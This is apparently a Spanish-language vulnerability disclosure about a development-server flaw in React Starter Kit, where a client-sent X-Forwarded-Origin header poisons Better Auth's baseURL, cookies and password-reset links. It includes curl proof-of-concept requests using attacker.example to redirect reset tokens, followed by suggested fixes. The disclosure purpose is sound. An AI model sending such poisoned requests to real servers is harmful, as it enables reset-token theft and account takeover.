Forwarded-origin auth poisoning_

MediumHeader poisoningNo response
React Starter KitBetter AuthHeader PoisoningDev Environment

Alcance: el problema afecta únicamente al entrypoint del servidor de desarrollo apps/api/dev.ts. La ruta de despliegue de producción en Cloudflare Workers (apps/api/worker.ts) obtiene APP_ORIGIN de bindings estáticos y no está afectada por este comportamiento.

Durante la revisión de React Starter Kit encontré que el header de solicitud X-Forwarded-Origin, controlado por el cliente, podía modificar la configuración de Better Auth en el servidor local de desarrollo.

El header se utilizaba para construir APP_ORIGIN sin allowlist ni validación, y createAuth() se reconstruía en cada petición con ese valor. Esto permitía envenenar la baseURL, trustedOrigins, el origen de passkeys y los prefijos de seguridad de las cookies.

La consecuencia más relevante confirmada fue el envenenamiento de enlaces de recuperación de contraseña: el token se incluía en una URL construida con la baseURL controlada por el header. En el entorno local, una petición podía hacer que el enlace enviado apuntara a infraestructura del atacante.

Origen controlado por el cliente

En apps/api/dev.ts, el origen de la aplicación se resolvía dando prioridad al header enviado por la solicitud:

APP_ORIGIN:
  c.req.header("x-forwarded-origin") ||
  process.env.APP_ORIGIN ||
  c.env.APP_ORIGIN ||
  "http://localhost:5173",

El valor no se validaba contra una allowlist ni contra el envSchema de apps/api/lib/env.ts, que solo valida Bun.env una vez durante la carga del módulo.

El proxy de Vite establece este header a partir del Origin/Host real del navegador en vite.config.ts. Sin embargo, el servidor de desarrollo confiaba en el header incluso cuando la petición llegaba directamente y no a través del proxy.

Superficie afectada en Better Auth

Better Auth utilizaba el valor en varios puntos de la configuración:

  • baseURL, para construir URLs absolutas.
  • trustedOrigins, para validar orígenes confiables.
  • rpID y origin de passkeys.
  • El flag Secure y los prefijos de las cookies de autenticación.

El efecto podía resumirse así:

X-Forwarded-Origin: https://attacker.example
        ↓
APP_ORIGIN = https://attacker.example
        ↓
createAuth() por petición
        ↓
baseURL / trustedOrigins / cookies alterados

Envenenamiento de cookies

En el entorno local, un sign-in normal no incluía prefijos seguros:

set-cookie: better-auth.session_token=<redacted>; Max-Age=604800; Path=/; HttpOnly; SameSite=Lax
set-cookie: auth=1; Path=/; HttpOnly; SameSite=Lax

La misma petición, añadiendo un único header controlado por el cliente, devolvía cookies con prefijo seguro y flag Secure:

set-cookie: __Secure-better-auth.session_token=<redacted>; Max-Age=604800; Path=/; HttpOnly; Secure; SameSite=Lax
set-cookie: __Host-auth=1; Path=/; HttpOnly; Secure; SameSite=Lax

Esto confirma que una cabecera no autenticada podía cambiar la forma en que Better Auth emitía las cookies de una sesión real. La consecuencia práctica depende del esquema HTTP/HTTPS y del proxy usado en el entorno de desarrollo.

Password-reset link poisoning

Better Auth 1.4.18 construía el enlace de recuperación utilizando ctx.context.baseURL:

const url = `${ctx.context.baseURL}/reset-password/${verificationToken}?callbackURL=${callbackURL}`;

El token se incluía directamente en el path. Si baseURL había sido envenenada, el enlace podía tomar esta forma:

https://attacker.example/api/auth/reset-password/<verification-token>?...

Una solicitud posterior al enlace enviaría el token a la infraestructura controlada por el atacante. El token podría reproducirse contra la API real, sujeto a su expiración y a las condiciones del flujo de recuperación.

Por qué el Origin no mitigaba el problema

La ruta de solicitud de recuperación estaba cubierta por el middleware global de Better Auth, pero la validación del Origin únicamente inspeccionaba el header Origin cuando la solicitud incluía una cookie o cuando se activaba forceValidate.

Una petición anónima de recuperación sin cookie no activaba esa condición. Por tanto, el atacante podía enviar el header X-Forwarded-Origin directamente al servidor de desarrollo sin necesitar un Origin válido ni una sesión previa.

Prueba de concepto local

La reproducción utilizó PostgreSQL 16, el comando bun db:push y bun api:dev. El servidor Bun escuchaba por defecto en 0.0.0.0 con el puerto 8787, por lo que era accesible desde la misma red si el equipo exponía el entrypoint sin un proxy restrictivo.

1. Crear un usuario de prueba

curl -X POST http://localhost:8787/api/auth/sign-up/email \
  -H "Content-Type: application/json" \
  -d '{
    "email":"victima@test.local",
    "password":"Test1234!",
    "name":"Victima"
  }'

2. Sign-in sin header

curl -is -X POST http://localhost:8787/api/auth/sign-in/email \
  -H "Content-Type: application/json" \
  -d '{
    "email":"victima@test.local",
    "password":"Test1234!"
  }'
set-cookie: better-auth.session_token=<redacted>; Max-Age=604800; Path=/; HttpOnly; SameSite=Lax
set-cookie: auth=1; Path=/; HttpOnly; SameSite=Lax

3. Sign-in con origen envenenado

curl -is -X POST http://localhost:8787/api/auth/sign-in/email \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-Origin: https://attacker.example" \
  -d '{
    "email":"victima@test.local",
    "password":"Test1234!"
  }'
set-cookie: __Secure-better-auth.session_token=<redacted>; Max-Age=604800; Path=/; HttpOnly; Secure; SameSite=Lax
set-cookie: __Host-auth=1; Path=/; HttpOnly; Secure; SameSite=Lax

Una única cabecera no autenticada cambió los prefijos y el atributo Secure de las cookies de una sesión válida.

4. Solicitud de recuperación

Con el mismo origen envenenado, la lógica de recuperación podía construir el enlace utilizando https://attacker.example como base:

POST /api/auth/request-password-reset
X-Forwarded-Origin: https://attacker.example

reset link:
https://attacker.example/api/auth/reset-password/<verification-token>?callbackURL=...

El token aparecía en la URL generada para el correo. En un laboratorio con un listener HTTPS controlado, la visita al enlace permitió observar la llegada del token al origen configurado por el atacante.

Alcance y limitaciones

  • El problema está limitado a apps/api/dev.ts, el entrypoint de desarrollo local.
  • apps/api/worker.ts utiliza bindings estáticos para APP_ORIGIN y no reproduce este flujo.
  • La explotación requiere que el servidor de desarrollo esté accesible desde la red del atacante.
  • El mecanismo de toma de cuenta se limita a datos de desarrollo o prueba, no a producción.
  • La prueba de concepto utiliza una cuenta local sintética y no datos de terceros.

Corrección sugerida

  • No dar prioridad a X-Forwarded-Origin enviado por el cliente sobre APP_ORIGIN configurado.
  • Validar cualquier origen reenviado contra ALLOWED_ORIGINS antes de usarlo en Better Auth.
  • Requerir explícitamente APP_ORIGIN también en desarrollo.
  • Confiar en forwarded headers únicamente cuando la petición provenga de un proxy conocido.
  • Utilizar una baseURL estática para la creación de Better Auth cuando sea posible.
  • Añadir pruebas que envíen headers de origen arbitrarios a los flujos de sign-in y password reset.

Better Auth dispone de la opción advanced.trustedProxyHeaders para leer headers de proxy específicos cuando no existe una baseURL estática. Ese modelo, junto con prioridad para la configuración de entorno, evita que un valor reenviado arbitrario sustituya al origen configurado.

Estado

El hallazgo fue reproducido mediante revisión de código y validación dinámica contra el commit dff3e037a06c9ad8889e5b7a14e3a4f61617f3ab. El artículo documenta únicamente el entrypoint de desarrollo y el alcance confirmado.
